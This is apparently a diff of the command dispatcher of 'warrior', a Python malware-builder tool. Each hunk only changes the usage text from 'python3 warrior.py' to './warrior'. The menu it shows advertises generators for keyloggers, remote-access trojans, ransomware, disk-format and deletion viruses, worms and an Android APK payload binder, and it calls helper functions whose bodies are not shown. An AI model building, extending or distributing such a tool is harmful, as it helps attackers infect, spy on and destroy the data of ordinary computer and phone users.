@@ -4653,9 +4653,9 @@ print(Fore.YELLOW + '''
 +|      -u          Update                 |+
 +|      -q          Quit                   |+
 ===================================================|
-+|  Ex. python3 warrior.py -o Linux -v 1 -s        |+
++|  Ex. ./warrior -o Linux -v 1 -s                 |+
 +|          (Create KeyLogger)                     |+
-+| Ex. python3 warrior.py -o Android -s            |+
++| Ex.  ./warrior -o Android -s                    |+
 +|           (Apk payload binder)                  |+
 ===================================================|''')
 
@@ -4676,17 +4676,17 @@ help = Fore.YELLOW + '''
 os = str(os.getcwd())
 while True:
  command = input(Fore.CYAN + "[+]Input a Command: ")
- if command == "python3 warrior.py -h":
+ if command == "./warrior -h":
     print(help)
     print("Try again.")
- elif command == "python3 warrior.py":
+ elif command == "./warrior":
     print(help)
     print("Try again.")
- elif command == "python3 warrior.py -o":
+ elif command == "./warrior -o":
     print(Fore.CYAN + 'Available operating systems...')
     time.sleep(2)
     print("Linux, Windows, Android")
- elif command == "python3 warrior.py -v":
+ elif command == "./warrior -v":
     print(Fore.MAGENTA + '''  
     =============================================
     +|              L I N U X                   |+
@@ -4728,14 +4728,14 @@ while True:
         ''')
     time.sleep(2)
     print(Fore.MAGENTA + '''
-      ||+────▀▄───▄▀─────+ |||==================|
+    ||  +────▀▄───▄▀─────+  ||=================||
     ||──────▄█▀███▀█▄───────|| A P K           ||
     ||─────█▀███████▀█──────|| P A Y L O A D   ||
     ||─────█─█▀▀▀▀▀█─█──────|| B I N D E R     ||
     ||────────▀▀─▀▀─────────||                 || 
-    ||python3 warrior.py -o Android -s         ||
-    ==========================================|''')
- elif command == "python3 warrior.py -o Windows":
+    ||./warrior -o Android -s                  ||
+    =============================================''')
+ elif command == "./warrior -o Windows":
     print(Fore.GREEN + '''
 =============================================
 +|           W I N D O W S                  |+
@@ -4758,17 +4758,17 @@ while True:
  ===========================================
     ''')
 
- elif command == "python3 warrior.py -o Android":
+ elif command == "./warrior -o Android":
     print(Fore.MAGENTA + '''
   +────▀▄───▄▀─────+ |||==================|
 ──────▄█▀███▀█▄───────|| A P K            |
 ─────█▀███████▀█──────|| P A Y L O A D    |
 ─────█─█▀▀▀▀▀█─█──────|| B I N D E R      |
 ────────▀▀─▀▀─────────||                  |
-python3 warrior.py -o Android -s          |
+./warrior -o Android -s                   |
 ==========================================|''')
 
- elif command == "python3 warrior.py -o Linux":
+ elif command == "./warrior -o Linux":
     print(Fore.MAGENTA + '''
 
 =============================================
@@ -4784,18 +4784,18 @@ python3 warrior.py -o Android -s          |
 +|       [6]Rat                            |+
  ===========================================
     ''')
- elif command == "python3 warrior.py -u":
+ elif command == "./warrior -u":
     print("Preparing for update...")
     os.system("git clone https://github.com/fonderelite/warrior")
     print(Fore.GREEN + "Done!")
     thanks()
- elif command == "python3 warrior.py -q":
+ elif command == "./warrior -q":
     print("Quitting...")
     time.sleep(2)
     thanks()
     quit()
 
- elif command == "python3 warrior.py -o Linux -v 1 -s":
+ elif command == "./warrior -o Linux -v 1 -s":
     print(Fore.YELLOW + "Your Current Dir is: " + os)
     print(Fore.YELLOW + "Making a keylogger...")
     time.sleep(3)
@@ -4805,7 +4805,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 1 -s":
+ elif command == "./warrior -o Windows -v 1 -s":
     os = str(os.getcwd())
     print(Fore.YELLOW + "Your Current Dir is: " + os)
     print(Fore.YELLOW + "Making a keylogger...")
@@ -4816,7 +4816,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 2 -s":
+ elif command == "./warrior -o Windows -v 2 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a System Deletion Virus...")
     time.sleep(3)
@@ -4826,7 +4826,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 3 -s":
+ elif command == "./warrior -o Windows -v 3 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Rat For Windows...")
     time.sleep(3)
@@ -4834,7 +4834,7 @@ python3 warrior.py -o Android -s          |
     rat1()
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
- elif command == "python3 warrior.py -o Windows -v 4 -s":
+ elif command == "./warrior -o Windows -v 4 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a WifiKiller Virus For Windows...")
     time.sleep(3)
@@ -4843,7 +4843,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Windows -v 5 -s":
+ elif command == "./warrior -o Windows -v 5 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Windows Destroyer Virus For Windows...")
     time.sleep(3)
@@ -4853,7 +4853,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 6 -s":
+ elif command == "./warrior -o Windows -v 6 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Ransomeware For Windows...")
     time.sleep(3)
@@ -4862,7 +4862,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Windows -v 7 -s":
+ elif command == "./warrior -o Windows -v 7 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the ILY Virus/Worm For Windows...")
     time.sleep(3)
@@ -4871,7 +4871,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Windows -v 8 -s":
+ elif command == "./warrior -o Windows -v 8 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the BlasterWorm.c For Windows...")
     time.sleep(3)
@@ -4880,7 +4880,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Windows -v 9 -s":
+ elif command == "./warrior -o Windows -v 9 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Format Virus For Windows...")
     time.sleep(3)
@@ -4889,7 +4889,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Windows -v 10 -s":
+ elif command == "./warrior -o Windows -v 10 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Registry Virus For Windows...")
     time.sleep(3)
@@ -4899,7 +4899,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 12 -s":
+ elif command == "./warrior -o Windows -v 12 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Neurax.go Worm For Windows...")
     time.sleep(3)
@@ -4909,7 +4909,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Windows -v 13 -s":
+ elif command == "./warrior -o Windows -v 13 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the SystemMeltdown Virus For Windows...")
     time.sleep(3)
@@ -4918,7 +4918,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Linux -v 2 -s":
+ elif command == "./warrior -o Linux -v 2 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the File Deletion Virus For Linux...")
     time.sleep(3)
@@ -4928,7 +4928,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Linux -v 3 -s":
+ elif command == "./warrior -o Linux -v 3 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the ELF Virus For Linux...")
     time.sleep(3)
@@ -4938,7 +4938,7 @@ python3 warrior.py -o Android -s          |
     print(Fore.GREEN + "DONE!")
     thanks()
 
- elif command == "python3 warrior.py -o Linux -v 4 -s":
+ elif command == "./warrior -o Linux -v 4 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making the Linux_Virus.c For Linux...")
     time.sleep(3)
@@ -4947,7 +4947,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Linux -v 5 -s":
+ elif command == "./warrior -o Linux -v 5 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Ransomware For Linux...")
     time.sleep(3)
@@ -4956,7 +4956,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Linux -v 6 -s":
+ elif command == "./warrior -o Linux -v 6 -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     print(Fore.YELLOW + "Making a Rat For Linux...")
     time.sleep(3)
@@ -4965,7 +4965,7 @@ python3 warrior.py -o Android -s          |
     time.sleep(3)
     print(Fore.GREEN + "DONE!")
     thanks()
- elif command == "python3 warrior.py -o Android -s":
+ elif command == "./warrior -o Android -s":
     print(Fore.YELLOW + "Your Current Dir is:" + os)
     android()
  else:
